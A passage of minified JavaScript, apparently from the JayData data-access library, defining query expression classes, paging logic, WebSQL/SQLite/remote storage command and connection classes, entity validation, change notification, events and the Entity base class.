chain!");break;}},instance:{enumerable:false},nodeType:{value:$data.Expressions.ExpressionType.EntitySet,enumerable:true}});$C('$data.Expressions.FrameOperationExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,operation,parameters){this.source=source;this.operation=operation;this.parameters=parameters;},nodeType:{value:$data.Expressions.ExpressionType.FrameOperation}});$C('$data.Expressions.EntityFunctionOperationExpression',$data.Expressions.FrameOperationExpression,null,{nodeType:{value:$data.Expressions.ExpressionType.EntityFunctionOperation}});$C('$data.Expressions.ContextFunctionOperationExpression',$data.Expressions.FrameOperationExpression,null,{nodeType:{value:$data.Expressions.ExpressionType.ContextFunctionOperation}});$C('$data.Expressions.FilterExpression',$data.Expressions.EntitySetExpression,null,{constructor:function(source,selector){this.resultType=$data.Array;},nodeType:{value:$data.Expressions.ExpressionType.Filter,enumerable:true}});$C('$data.Expressions.InlineCountExpression',$data.Expressions.EntitySetExpression,null,{constructor:function(source,selector){},nodeType:{value:$data.Expressions.ExpressionType.InlineCount,enumerable:true}});$C('$data.Expressions.FrameOperator',$data.Expressions.ExpressionNode,null,{constructor:function(){this.isTerminated=true;}});$C('$data.Expressions.CountExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Integer;},nodeType:{value:$data.Expressions.ExpressionType.Count,enumerable:true}});$C('$data.Expressions.SingleExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Object;},nodeType:{value:$data.Expressions.ExpressionType.Single,enumerable:true}});$C('$data.Expressions.FirstExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Object;},nodeType:{value:$data.Expressions.ExpressionType.First,enumerable:true}});$C('$data.Expressions.ForEachExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Array;},nodeType:{value:$data.Expressions.ExpressionType.ForEach,enumerable:true}});$C('$data.Expressions.ToArrayExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Array;},nodeType:{value:$data.Expressions.ExpressionType.ToArray,enumerable:true}});$C('$data.Expressions.SomeExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Object;},nodeType:{value:$data.Expressions.ExpressionType.Some,enumerable:true}});$C('$data.Expressions.EveryExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Object;},nodeType:{value:$data.Expressions.ExpressionType.Every,enumerable:true}});$C('$data.Expressions.BatchDeleteExpression',$data.Expressions.FrameOperator,null,{constructor:function(source){this.source=source;this.resultType=$data.Integer;},nodeType:{value:$data.Expressions.ExpressionType.BatchDelete,enumerable:true}});$C('$data.Expressions.IncludeExpression',$data.Expressions.EntitySetExpression,null,{constructor:function(source,selector){},nodeType:{value:$data.Expressions.ExpressionType.Include,writable:true},toString:function(debug){var result="unimplemented";return result;}},null);$C('$data.Expressions.MemberInfoExpression',$data.Expressions.ExpressionNode,null,{constructor:function(memberDefinition){this.memberDefinition=memberDefinition;this.memberName=memberDefinition.name;},nodeType:{value:$data.Expressions.ExpressionType.MemberInfo,enumerable:true}});$C('$data.Expressions.OrderExpression',$data.Expressions.EntitySetExpression,null,{constructor:function(source,expression,nType){this.nodeType=nType;},nodeType:{value:$data.Expressions.ExpressionType.OrderBy,writable:true},toString:function(debug){var result="unimplemented";return result;}},null);$C('$data.Expressions.ParametricQueryExpression',$data.Expressions.ExpressionNode,null,{constructor:function(expression,parameters){this.expression=expression;this.parameters=parameters;},nodeType:{value:$data.Expressions.ExpressionType.ParametricQuery,enumerable:true}});$C('$data.Expressions.ProjectionExpression',$data.Expressions.EntitySetExpression,null,{constructor:function(source,selector,params,instance){},nodeType:{value:$data.Expressions.ExpressionType.Projection,enumerable:true}});$C('$data.Expressions.QueryExpressionCreator',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(scopeContext){Guard.requireValue("scopeContext",scopeContext);this.scopeContext=scopeContext;},VisitEntitySetExpression:function(expression,context){if(expression.source instanceof $data.Expressions.EntityContextExpression){this.lambdaTypes.push(expression);}
return expression;},VisitServiceOperationExpression:function(expression,context){if(expression.source instanceof $data.Expressions.EntityContextExpression){this.lambdaTypes.push(expression);}
return expression;},VisitCodeExpression:function(expression,context){var source=expression.source.toString();var jsCodeTree=Container.createCodeParser(this.scopeContext).createExpression(source);this.scopeContext.log({event:"JSCodeExpression",data:jsCodeTree});var constantResolver=Container.createConstantValueResolver(expression.parameters,window,this.scopeContext);var parameterProcessor=Container.createParameterResolverVisitor();jsCodeTree=parameterProcessor.Visit(jsCodeTree,constantResolver);this.scopeContext.log({event:"JSCodeExpressionResolved",data:jsCodeTree});var code2entity=Container.createCodeToEntityConverter(this.scopeContext);var entityExpression=code2entity.Visit(jsCodeTree,{queryParameters:expression.parameters,lambdaParameters:this.lambdaTypes,frameType:context.frameType});var result=Container.createParametricQueryExpression(entityExpression,code2entity.parameters);this.scopeContext.log({event:"EntityExpression",data:entityExpression});return result;},VisitFilterExpression:function(expression,context){var source=this.Visit(expression.source,context);context=context||{};context.frameType=expression.getType();var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){return Container.createFilterExpression(source,selector,expression.params,expression.instance);}
return expression;},VisitInlineCountExpression:function(expression,context){var source=this.Visit(expression.source,context);context=context||{};context.frameType=expression.getType();var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){return Container.createInlineCountExpression(source,selector,expression.params,expression.instance);}
return expression;},VisitProjectionExpression:function(expression,context){var source=this.Visit(expression.source,context);context=context||{};context.frameType=expression.getType();var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){var expr=Container.createProjectionExpression(source,selector,expression.params,expression.instance);expr.projectionAs=expression.projectionAs;return expr;}
return expression;},VisitOrderExpression:function(expression,context){var source=this.Visit(expression.source,context);context=context||{};context.frameType=expression.getType();var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){return Container.createOrderExpression(source,selector,expression.nodeType);}
return expression;}});$C('$data.Expressions.QueryParameterExpression',$data.Expressions.ExpressionNode,null,{constructor:function(name,index,value,type){this.name=name;this.index=index;this.value=value;this.type=Container.getTypeName(value);},nodeType:{value:$data.Expressions.ExpressionType.QueryParameter,writable:false}});$C('$data.Expressions.RepresentationExpression',$data.Expressions.ExpressionNode,null,{constructor:function(kind){},getMemberDefinition:function(name){return this.entityType.getMemberDefinition(name);},nodeType:{value:$data.Expressions.ExpressionType.Entity}});$C('$data.Expressions.ServiceOperationExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,selector,params,cfg,bindedEntity){Guard.requireType("source",source,[$data.Expressions.EntityContextExpression]);Guard.requireType("selector",source,[$data.Expressions.MemberInfoExpression]);this.source=source;this.selector=selector
this.params=params
this.cfg=cfg;this.bindedEntity=bindedEntity;function findContext(){var r=source;while(r){if(r instanceof $data.Expressions.EntityContextExpression){return r;}
r=r.source;}}
var c=findContext();switch(true){case this.source instanceof $data.Expressions.EntityContextExpression:this.elementType=cfg.elementType?Container.resolveType(cfg.elementType):(this.elementType?Container.resolveType(cfg.returnType):null);this.storageModel=cfg.elementType?c.instance._storageModel.getStorageModel(Container.resolveType(cfg.elementType)):null;break;default:Guard.raise("Unknown source type for EntitySetExpression: "+this.source.getType().name);}},nodeType:{value:$data.Expressions.ExpressionType.ServiceOperation,enumerable:true}});$C('$data.Expressions.ContinuationExpressionBuilder',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(mode){this.mode=mode;},compile:function(query){var findContext={mode:"find",skipExists:false};this.Visit(query.expression,findContext);var result={skip:findContext.skipSize,take:findContext.pageSize,message:''}
if('pageSize'in findContext){var expression;var context={mode:this.mode,pageSize:findContext.pageSize};if(!findContext.skipExists&&(findContext.pageSize)){context.append=true;expression=this.Visit(query.expression,context);}else if(findContext.skipExists){expression=this.Visit(query.expression,context)}
if(!context.abort){result.expression=expression}
else{result.skip=(result.skip||0)-result.take;result.message='Invalid skip value!';}}else{result.message='take expression not defined in the chain!';}
return result;},VisitPagingExpression:function(expression,context){switch(context.mode){case'find':if(expression.nodeType===$data.Expressions.ExpressionType.Take){context.pageSize=expression.amount.value;}else{context.skipSize=expression.amount.value;context.skipExists=true;}
break;case'prev':if(expression.nodeType===$data.Expressions.ExpressionType.Skip){var amount=expression.amount.value-context.pageSize;context.abort=amount<0&&expression.amount.value>=context.pageSize;var constExp=Container.createConstantExpression(Math.max(amount,0),"number");return Container.createPagingExpression(expression.source,constExp,expression.nodeType);}else if(context.append){context.abort=true;}
break;case'next':if(expression.nodeType===$data.Expressions.ExpressionType.Skip){var amount=context.pageSize+expression.amount.value;var constExp=Container.createConstantExpression(amount,"number");return Container.createPagingExpression(expression.source,constExp,expression.nodeType);}else if(context.append){var constExp=Container.createConstantExpression(context.pageSize,"number");return Container.createPagingExpression(expression,constExp,$data.Expressions.ExpressionType.Skip);}
break;default:}
this.Visit(expression.source,context);}});$data.Class.define('$data.dbClient.DbCommand',null,null,{connection:{},parameters:{},execute:function(callback){Guard.raise("Pure class");}},null);$data.Class.define('$data.dbClient.DbConnection',null,null,{connectionParams:{},database:{},isOpen:function(){Guard.raise("Pure class");},open:function(){Guard.raise("Pure class");},close:function(){Guard.raise("Pure class");},createCommand:function(){Guard.raise("Pure class");}},null);$data.Class.define('$data.dbClient.openDatabaseClient.OpenDbCommand',$data.dbClient.DbCommand,null,{constructor:function(con,queryStr,params){this.query=queryStr;this.connection=con;this.parameters=params;},executeNonQuery:function(callback,tran,isWrite){callback=$data.typeSystem.createCallbackSetting(callback);this.exec(this.query,this.parameters,callback.success,callback.error,tran,isWrite);},executeQuery:function(callback,tran,isWrite){callback=$data.typeSystem.createCallbackSetting(callback);this.exec(this.query,this.parameters,callback.success,callback.error,tran,isWrite);},exec:function(query,parameters,callback,errorhandler,transaction,isWrite){this.connection.open({error:errorhandler,success:function(tran){var single=false;if(!(query instanceof Array)){single=true;query=[query];parameters=[parameters];}
var results=[];var remainingCommands=0;function decClb(){if(--remainingCommands==0){callback(single?results[0]:results,transaction);}}
query.forEach(function(q,i){remainingCommands++;if(q){tran.executeSql(query[i],parameters[i],function(trx,result){var r={rows:[]};try{r.insertId=result.insertId;}catch(e){r.rowsAffected=result.rowsAffected;var maxItem=result.rows.length;for(var j=0;j<maxItem;j++){r.rows.push(result.rows.item(j));}}
results[i]=r;decClb(trx);},function(trx,err){var _q=q;var _i=i;if(errorhandler)
errorhandler(err);return true;});}else{results[i]=null;decClb();}});}},transaction,isWrite);}},null);$data.Class.define('$data.dbClient.openDatabaseClient.OpenDbConnection',$data.dbClient.DbConnection,null,{constructor:function(params){this.connectionParams=params;},isOpen:function(){return this.database!==null&&this.database!==undefined&&this.transaction!==null&&this.transaction!==undefined;},open:function(callBack,tran,isWrite){if(isWrite===undefined)
isWrite=true;if(tran){callBack.success(tran.transaction);}else if(this.database){if(isWrite){this.database.transaction(function(tran){callBack.success(tran);},callBack.error,callBack.oncomplete);}else{this.database.readTransaction(function(tran){callBack.success(tran);},callBack.error,callBack.oncomplete);}}else{var p=this.connectionParams;var con=this;this.database=openDatabase(p.fileName,p.version,p.displayName,p.maxSize);if(isWrite){this.database.transaction(function(tran){callBack.success(tran);},callBack.error,callBack.oncomplete);}else{this.database.readTransaction(function(tran){callBack.success(tran);},callBack.error,callBack.oncomplete);}}},close:function(){this.transaction=undefined;this.database=undefined;},createCommand:function(queryStr,params){var cmd=new $data.dbClient.openDatabaseClient.OpenDbCommand(this,queryStr,params);return cmd;}},null);$data.Class.define('$data.dbClient.jayStorageClient.JayStorageCommand',$data.dbClient.DbCommand,null,{constructor:function(con,queryStr,params){this.query=queryStr;this.connection=con;this.parameters=params;},executeNonQuery:function(callback){callback=$data.typeSystem.createCallbackSetting(callback);this.exec(this.query,this.parameters,callback.success,callback.error);},executeQuery:function(callback){callback=$data.typeSystem.createCallbackSetting(callback);this.exec(this.query,this.parameters,callback.success,callback.error);},exec:function(query,parameters,callback,errorhandler){if(parameters==null||parameters==undefined){parameters={};}
var single=false;if(!(query instanceof Array)){single=true;query=[query];parameters=[parameters];}
var provider=this;var results=[];var remainingCommands=query.length;var decClb=function(){if(--remainingCommands==0){callback(single?results[0]:results);}};query.forEach(function(q,i){if(q){$data.ajax({url:'http'+(this.connection.connectionParams.storage.ssl?'s':'')+'://'+this.connection.connectionParams.storage.src.replace('http://','').replace('https://','')+'?db='+this.connection.connectionParams.storage.key,type:'POST',headers:{'X-PINGOTHER':'pingpong'},data:{query:q,parameters:parameters[i]},dataType:'json',contentType:'application/json;charset=UTF-8',success:function(data){if(data&&data.error){console.log('JayStorage error',data.error);errorhandler(data.error);return;}
if(this.lastID){results[i]={insertId:this.lastID,rows:(data||{rows:[]}).rows};}else results[i]={rows:(data||{rows:[]}).rows};decClb();}});}else{results[i]=null;decClb();}},this);}},null);$data.Class.define('$data.dbClient.jayStorageClient.JayStorageConnection',$data.dbClient.DbConnection,null,{constructor:function(params){this.connectionParams=params;},isOpen:function(){return true;},open:function(){},close:function(){},createCommand:function(queryStr,params){var cmd=new $data.dbClient.jayStorageClient.JayStorageCommand(this,queryStr,params);return cmd;}},null);$data.Class.define('$data.dbClient.sqLiteNJClient.SqLiteNjCommand',$data.dbClient.DbCommand,null,{constructor:function(con,queryStr,params){this.query=queryStr;this.connection=con;this.parameters=params;},executeNonQuery:function(callback){callback=$data.typeSystem.createCallbackSetting(callback);this.exec(this.query,this.parameters,callback.success,callback.error);},executeQuery:function(callback){callback=$data.typeSystem.createCallbackSetting(callback);this.exec(this.query,this.parameters,callback.success,callback.error);},exec:function(query,parameters,callback,errorhandler){if(!this.connection.isOpen()){this.connection.open();}
if(parameters==null||parameters==undefined){parameters={};}
var single=false;if(!(query instanceof Array)){single=true;query=[query];parameters=[parameters];}
var provider=this;var results=[];var remainingCommands=0;var decClb=function(){if(--remainingCommands==0){provider.connection.database.exec('COMMIT');callback(single?results[0]:results);}};provider.connection.database.exec('BEGIN');query.forEach(function(q,i){remainingCommands++;if(q){var sqlClb=function(error,rows){if(error!=null){errorhandler(error);return;}
if(this.lastID){results[i]={insertId:this.lastID,rows:[]};}else{results[i]={rows:rows};}
decClb();};var stmt=provider.connection.database.prepare(q,parameters[i]);if(q.indexOf('SELECT')==0){stmt.all(sqlClb);}else{stmt.run(sqlClb);}
stmt.finalize();}else{results[i]=null;decClb();}},this);}},null);$data.Class.define('$data.dbClient.sqLiteNJClient.SqLiteNjConnection',$data.dbClient.DbConnection,null,{constructor:function(params){this.connectionParams=params;},isOpen:function(){return this.database!==null&&this.database!==undefined;},open:function(){if(this.database==null){var p=this.connectionParams;this.database=new sqLiteModule.Database(p.fileName);}},close:function(){},createCommand:function(queryStr,params){var cmd=new $data.dbClient.sqLiteNJClient.SqLiteNjCommand(this,queryStr,params);return cmd;}},null);$data.Class.define('$data.Validation.ValidationError',null,null,{constructor:function(message,propertyDefinition,type){this.Message=message;this.PropertyDefinition=propertyDefinition;this.Type=type;},Type:{dataType:'string'},Message:{dataType:"string"},PropertyDefinition:{dataType:$data.MemberDefinition}},null);$data.Class.define('$data.Validation.EntityValidationBase',null,null,{ValidateEntity:function(entity){return[];},ValidateEntityField:function(entity,memberDefinition){return[];},getValidationValue:function(memberDefinition,validationName){Guard.raise("Pure class");},getValidationMessage:function(memberDefinition,validationName,defaultMessage){Guard.raise("Pure class");}},null);$data.Validation=$data.Validation||{};$data.Validation.Entity=new $data.Validation.EntityValidationBase();$data.Class.define('$data.Validation.EntityValidation',$data.Validation.EntityValidationBase,null,{ValidateEntity:function(entity){var errors=[];entity.getType().memberDefinitions.getPublicMappedProperties().forEach(function(memDef){errors=errors.concat(this.ValidateEntityField(entity,memDef,undefined,true));},this);return errors;},ValidateEntityField:function(entity,memberDefinition,newValue,valueNotSet){var errors=[];var typeName=Container.resolveName(Container.resolveType(memberDefinition.dataType));var value=!valueNotSet?newValue:entity[memberDefinition.name];this.fieldValidate(entity,memberDefinition,value,errors,typeName);return errors;},getValidationValue:function(memberDefinition,validationName){if(memberDefinition[validationName]&&memberDefinition[validationName].value)
return memberDefinition[validationName].value;else
return memberDefinition[validationName];},getValidationMessage:function(memberDefinition,validationName,defaultMessage){var eMessage=defaultMessage;if(typeof memberDefinition[validationName]=="object"&&memberDefinition[validationName].message)
eMessage=memberDefinition[validationName].message;else if(memberDefinition.errorMessage)
eMessage=memberDefinition.errorMessage;return eMessage;},createValidationError:function(memberDefinition,validationName,defaultMessage){return new $data.Validation.ValidationError(this.getValidationMessage(memberDefinition,validationName,defaultMessage),memberDefinition,validationName);},supportedValidations:{value:{'$data.Number':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;},minValue:function(value,definedValue){return Object.isNullOrUndefined(value)||value>=definedValue;},maxValue:function(value,definedValue){return Object.isNullOrUndefined(value)||value<=definedValue;}},'$data.Integer':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;},minValue:function(value,definedValue){return Object.isNullOrUndefined(value)||value>=definedValue;},maxValue:function(value,definedValue){return Object.isNullOrUndefined(value)||value<=definedValue;}},'$data.String':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;},minLength:function(value,definedValue){return Object.isNullOrUndefined(value)||value.length>=definedValue;},maxLength:function(value,definedValue){return Object.isNullOrUndefined(value)||value.length<=definedValue;},length:function(value,definedValue){return Object.isNullOrUndefined(value)||value.length==definedValue;},regex:function(value,definedValue){return Object.isNullOrUndefined(value)||value.match(typeof definedValue==='string'?new RegExp((definedValue.indexOf('/')===0&&definedValue.lastIndexOf('/')===(definedValue.length-1))?definedValue.slice(1,-1):definedValue):definedValue)}},'$data.Date':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;},minValue:function(value,definedValue){return Object.isNullOrUndefined(value)||value>=definedValue;},maxValue:function(value,definedValue){return Object.isNullOrUndefined(value)||value<=definedValue;}},'$data.Boolean':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;}},'$data.Array':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;},length:function(value,definedValue){return Object.isNullOrUndefined(value)||value.length==definedValue;}},'$data.Object':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;}},'$data.Guid':{required:function(value,definedValue){return!Object.isNullOrUndefined(value);},customValidator:function(value,definedValue){return Object.isNullOrUndefined(value)||typeof definedValue=="function"?definedValue(value):true;}}}},fieldValidate:function(entity,memberDefinition,value,errors,validationTypeName){if((entity.entityState==$data.EntityState.Modified&&entity[memberDefinition.name]==undefined))
return;var validatonGroup=this.supportedValidations[validationTypeName];if(validatonGroup){var validations=Object.keys(validatonGroup);validations.forEach(function(validation){if(memberDefinition[validation]&&validatonGroup[validation]&&!validatonGroup[validation].call(entity,value,this.getValidationValue(memberDefinition,validation)))
errors.push(this.createValidationError(memberDefinition,validation,'Validation error!'));},this);}}},null);$data.Validation.Entity=new $data.Validation.EntityValidation();$data.Class.define('$data.Notifications.ChangeDistributorBase',null,null,{distributeData:function(collectorData){Guard.raise("Pure class");}},null);$data.Class.define('$data.Notifications.ChangeCollectorBase',null,null,{buildData:function(entityContextData){Guard.raise("Pure class");},processChangedData:function(entityData){if(this.Distrbutor&&this.Distrbutor.distributeData)
this.Distrbutor.distributeData(this.buildData(entityData));},Distrbutor:{enumerable:false,dataType:$data.Notifications.ChangeDistributorBase,storeOnObject:true}},null);$data.Class.define('$data.Notifications.ChangeDistributor',$data.Notifications.ChangeDistributorBase,null,{constructor:function(broadcastUrl){this.broadcastUrl=broadcastUrl;},distributeData:function(data){$data.ajax({url:this.broadcastUrl,type:"POST",data:'data='+JSON.stringify(data),succes:this.success,error:this.error});},broadcastUrl:{dataType:"string"},success:function(){},error:function(){}},null);$data.Class.define('$data.Notifications.ChangeCollector',$data.Notifications.ChangeCollectorBase,null,{buildData:function(entities){var result=[];entities.forEach(function(element){var resObj={entityState:element.data.entityState,typeName:element.data.getType().name};var enumerableMemDefCollection=[];switch(element.data.entityState){case $data.EntityState.Added:enumerableMemDefCollection=element.data.getType().memberDefinitions.getPublicMappedProperties();break;case $data.EntityState.Modified:enumerableMemDefCollection=element.data.changedProperties;break;case $data.EntityState.Deleted:enumerableMemDefCollection=element.data.getType().memberDefinitions.getKeyProperties();break;default:break;}
enumerableMemDefCollection.forEach(function(memDef){resObj[memDef.name]=element.data[memDef.name];});result.push(resObj);});return result;}},null);$data.Class.define('$data.Transaction',null,null,{constructor:function(){this._objectId=(new Date()).getTime();$data.Trace.log("create: ",this._objectId);this.oncomplete=new $data.Event("oncomplete",this);this.onerror=new $data.Event("onerror",this);},abort:function(){Guard.raise(new Exception('Not Implemented','Not Implemented',arguments));},_objectId:{type:$data.Integer},transaction:{type:$data.Object},oncomplete:{type:$data.Event},onerror:{type:$data.Event}},null);$data.Class.define('$data.Access',null,null,{},{isAuthorized:function(access,user,sets,callback){var pHandler=new $data.PromiseHandler();var clbWrapper=pHandler.createCallback(callback);var pHandlerResult=pHandler.getPromise();clbWrapper.success(true);return pHandlerResult;},getAccessBitmaskFromPermission:function(p){var access=$data.Access.None;if(p.Create)access|=$data.Access.Create;if(p.Read)access|=$data.Access.Read;if(p.Update)access|=$data.Access.Update;if(p.Delete)access|=$data.Access.Delete;if(p.DeleteBatch)access|=$data.Access.DeleteBatch;if(p.Execute)access|=$data.Access.Execute;return access;},None:{value:0},Create:{value:1},Read:{value:2},Update:{value:4},Delete:{value:8},DeleteBatch:{value:16},Execute:{value:32}});$data.Class.define('$data.Promise',null,null,{always:function(){Guard.raise(new Exception('$data.Promise.always','Not implemented!'));},done:function(){Guard.raise(new Exception('$data.Promise.done','Not implemented!'));},fail:function(){Guard.raise(new Exception('$data.Promise.fail','Not implemented!'));},isRejected:function(){Guard.raise(new Exception('$data.Promise.isRejected','Not implemented!'));},isResolved:function(){Guard.raise(new Exception('$data.Promise.isResolved','Not implemented!'));},pipe:function(){Guard.raise(new Exception('$data.Promise.pipe','Not implemented!'));},progress:function(){Guard.raise(new Exception('$data.Promise.progress','Not implemented!'));},promise:function(){Guard.raise(new Exception('$data.Promise.promise','Not implemented!'));},state:function(){Guard.raise(new Exception('$data.Promise.state','Not implemented!'));},then:function(){Guard.raise(new Exception('$data.Promise.then','Not implemented!'));}},null);$data.Class.define('$data.PromiseHandlerBase',null,null,{constructor:function(){},createCallback:function(callBack){callBack=$data.typeSystem.createCallbackSetting(callBack);return cbWrapper={success:callBack.success,error:callBack.error,notify:callBack.notify};},getPromise:function(){return new $data.Promise();}},null);$data.PromiseHandler=$data.PromiseHandlerBase;var EventSubscriber=$data.Class.define("EventSubscriber",null,null,{constructor:function(handler,state,thisArg){this.handler=handler;this.state=state;this.thisArg=thisArg;},handler:{},state:{},thisArg:{}});$data.Event=Event=$data.Class.define("$data.Event",null,null,{constructor:function(name,sender){var subscriberList=null;var parentObject=sender;function detachHandler(list,handler){list.forEach(function(item,index){if(item.handler==handler){list.splice(index,1);}});}
this.attach=function(handler,state,thisArg){if(!subscriberList){subscriberList=[];}
subscriberList.push(new EventSubscriber(handler,state,thisArg||sender));};this.detach=function(handler){detachHandler(subscriberList,handler);};this.fire=function(eventData,snder){var snd=snder||sender||this;if(subscriberList){subscriberList.forEach(function(subscriber){try{subscriber.handler.call(subscriber.thisArg,snd,eventData,subscriber.state);}catch(ex){console.log("unhandled exception in event handler. exception suppressed");console.dir(ex);}});}};this.fireCancelAble=function(eventData,snder){var snd=snder||sender||this;var isValid=true;if(subscriberList){subscriberList.forEach(function(subscriber){try{isValid=isValid&&(subscriber.handler.call(subscriber.thisArg,snd,eventData,subscriber.state)===false?false:true);}catch(ex){console.log("unhandled exception in event handler. exception suppressed");console.dir(ex);}});}
return isValid;};}});var eventData=$data.Class.define("EventData",null,null,{eventName:{}});var PropertyChangeEventData=$data.Class.define("PropertyChangeEventData",EventData,null,{constructor:function(propertyName,oldValue,newValue){this.propertyName=propertyName;this.oldValue=oldValue;this.newValue=newValue;},propertyName:{},oldValue:{},newValue:{}});var PropertyValidationEventData=$data.Class.define("PropertyValidationEventData",EventData,null,{constructor:function(propertyName,oldValue,newValue,errors){this.propertyName=propertyName;this.oldValue=oldValue;this.newValue=newValue;this.errors=errors;this.cancel=false;},propertyName:{},oldValue:{},newValue:{},errors:{},cancel:{}});$data.Entity=Entity=$data.Class.define("$data.Entity",null,null,{constructor:function(initData,newInstanceOptions){this.initData={};var thisType=this.getType();if(thisType.__copyPropertiesToInstance){$data.typeSystem.writePropertyValues(this);}
var ctx=null;this.context=ctx;if("setDefaultValues"in thisType){if(!newInstanceOptions||newInstanceOptions.setDefaultValues!==false){if(!initData||Object.keys(initData).length<1){initData=thisType.setDefaultValues(initData);}}}
if(typeof initData==="object"){var typeMemDefs=thisType.memberDefinitions;var memDefNames=typeMemDefs.getPublicMappedPropertyNames();for(var i in initData){if(memDefNames.indexOf(i)>-1){var type=Container.resolveType(typeMemDefs.getMember(i).type);if(!Object.isNullOrUndefined(initData[i])){if(type===$data.Date&&typeof initData[i]==='string')
this.initData[i]=new Date(initData[i]);else if(type===$data.GeographyPoint&&typeof initData[i]==='object'&&!(initData[i]instanceof $data.GeographyPoint))
this.initData[i]=new $data.GeographyPoint(initData[i]);else if(type===$data.GeographyLineString&&!(initData[i]instanceof $data.GeographyLineString))
this.initData[i]=new $data.GeographyLineString(initData[i]);else if(type===$data.GeographyPolygon&&!(initData[i]instanceof $data.GeographyPolygon))
this.initData[i]=new $data.GeographyPolygon(initData[i]);else if(type===$data.GeographyMultiPoint&&!(initData[i]instanceof $data.GeographyMultiPoint))
this.initData[i]=new $data.GeographyMultiPoint(initData[i]);else if(type===$data.GeographyMultiLineString&&!(initData[i]instanceof $data.GeographyMultiLineString))
this.initData[i]=new $data.GeographyMultiLineString(initData[i]);else if(type===$data.GeographyMultiPolygon&&!(initData[i]instanceof $data.GeographyMultiPolygon))
this.initData[i]=new $data.GeographyMultiPolygon(initData[i]);else if(type===$data.GeographyCollection&&!(initData[i]instanceof $data.GeographyCollection))
this.initData[i]=new $data.GeographyCollection(initData[i]);else if(type===$data.GeometryPoint&&typeof initData[i]==='object'&&!(initData[i]instanceof $data.GeometryPoint))
this.initData[i]=new $data.GeometryPoint(initData[i]);else if(type===$data.GeometryLineString&&!(initData[i]instanceof $data.GeometryLineString))
this.initData[i]=new $data.GeometryLineString(initData[i]);else if(type===$data.GeometryPolygon&&!(initData[i]instanceof $data.GeometryPolygon))
this.initData[i]=new $data.GeometryPolygon(initData[i]);else if(type===$data.GeometryMultiPoint&&!(initData[i]instanceof $data.GeometryMultiPoint))
this.initData[i]=new $data.GeometryMultiPoint(initData[i]);else if(type===$data.GeometryMultiLineString&&!(initData[i]instanceof $data.GeometryMultiLineString))
this.initData[i]=new $data.GeometryMultiLineString(initData[i]);else if(type===$data.GeometryMultiPolygon&&!(initData[i]instanceof $data.GeometryMultiPolygon))
this.initData[i]=new $data.GeometryMultiPolygon(initData[i]);else if(type===$data.GeometryCollection&&!(initData[i]instanceof $data.GeometryCollection))
this.initData[i]=new $data.GeometryCollection(initData[i]);else if(type===$data.Guid&&!(initData[i]instanceof $data.Guid))
this.initData[i]=initData[i]?$data.parseGuid(initData[i]):undefined;else{this.initData[i]=initData[i];}}else{this.initData[i]=initData[i];}}}}
if(newInstanceOptions&&newInstanceOptions.entityBuilder){newInstanceOptions.entityBuilder(this,thisType.memberDefinitions.asArray(),thisType);}
this.changedProperties=undefined;this.entityState=undefined;},toString:function(){return this.getType().fullName+"("+(this.Id||this.Name||'')+")"},toJSON:function(){var result={};var self=this;this.getType().memberDefinitions.getPublicMappedProperties().forEach(function(memDef){result[memDef.name]=self[memDef.name];});return result;},equals:function(entity){if(entity.getType()!==this.getType()){return false;}
var entityPk=this.getType().memberDefinitions.getKeyProperties();for(var i=0;i<entityPk.length;i++){if(this[entityPk[i].name]==entity[entityPk[i].name]){return true;}}
return false;},propertyChanging:{dataType:$data.Event,storeOnObject:true,monitorChanges:false,notMapped:true,enumerable:false,prototypeProperty:true,get:function(){if(!this._propertyChanging)
this._propertyChanging=new Event('propertyChanging',this);return this._propertyChanging;},set:function(value){this._propertyChanging=value;}},propertyChanged:{dataType:$data.Event,storeOnObject:true,monitorChanges:false,notMapped:true,enumerable:false,prototypeProperty:true,get:function(){if(!this._propertyChanged)
this._propertyChanged=new Event('propertyChanged',this);return this._propertyChanged;},set:function(value){this._propertyChanged=value;}},propertyValidationError:{dataType:$data.Event,storeOnObject:true,monitorChanges:false,notMapped:true,enumerable:false,prototypeProperty:true,get:function(){if(!this._propertyValidationError)
this._propertyValidationError=new Event('propertyValidationError',this);return this._propertyValidationError;},set:function(value){this._propertyValidationError=value;}},storeProperty:function(memberDefinition,value){value=this.typeConversion(memberDefinition,value);var eventData=null;if(memberDefinition.monitorChanges!=false&&(this._propertyChanging||this._propertyChanged||"instancePropertyChanged"in this.constructor)){var origValue=this[memberDefinition.name];eventData=new PropertyChangeEventData(memberDefinition.name,origValue,value);if(this._propertyChanging)
